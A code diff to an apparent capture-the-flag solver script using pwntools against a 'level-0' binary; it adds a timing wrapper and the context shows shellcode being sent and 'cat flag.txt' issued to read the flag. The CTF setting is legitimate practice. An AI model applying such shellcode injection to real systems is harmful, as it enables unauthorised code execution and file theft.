@@ -11,6 +11,7 @@ Returns:
     The flag to solve the challenge.
 '''
 
+import time
 from pwn import *
 
 exe = ELF('./level-0')
@@ -48,13 +49,21 @@ def main():
         io.sendline(shellcode)
 
         # Get the flag.
-        io.sendline("cat flag.txt")
-        flag = io.recvline()
-        log.success(f"Flag: {flag}")
+        io.sendline('cat flag.txt')
+        flag = io.recv()
+        log.success(f'Flag: {flag}')
 
         return flag
 
+def time_func(func):
+    '''Time the main function.
+    '''
+
+    start = time.time()
+    func()
+    end = time.time()
+
+    log.success(f'Time: {end - start}')
 
 if __name__ == '__main__':
-    main()
-
+    time_func(main)
